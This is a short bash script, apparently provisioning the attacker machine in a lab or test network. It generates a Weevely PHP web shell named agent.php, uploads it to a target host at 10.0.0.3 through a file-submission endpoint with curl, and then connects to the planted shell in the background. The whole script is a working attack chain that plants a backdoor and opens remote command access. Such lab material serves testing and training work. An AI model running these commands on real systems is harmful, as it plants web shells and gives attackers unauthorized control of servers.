#!/usr/bin/env bash

# Additional bash provisioning test
echo "Attacker config working"

echo "EXEC cd ~/weevely3"
cd ~/weevely3

echo "EXEC ./weevely.py generate pass agent.php"
./weevely.py generate pass agent.php

echo "exec curl -F 'file=@agent.php' http://10.0.0.3:5000/submit"
curl -F 'file=@agent.php' http://10.0.0.3:5000/submit

echo "./weevely.py http://10.0.0.3:8000/agent.php pass"
./weevely.py http://10.0.0.3:8000/agent.php pass &

echo "sleep 5"
sleep 5

echo "DONE"
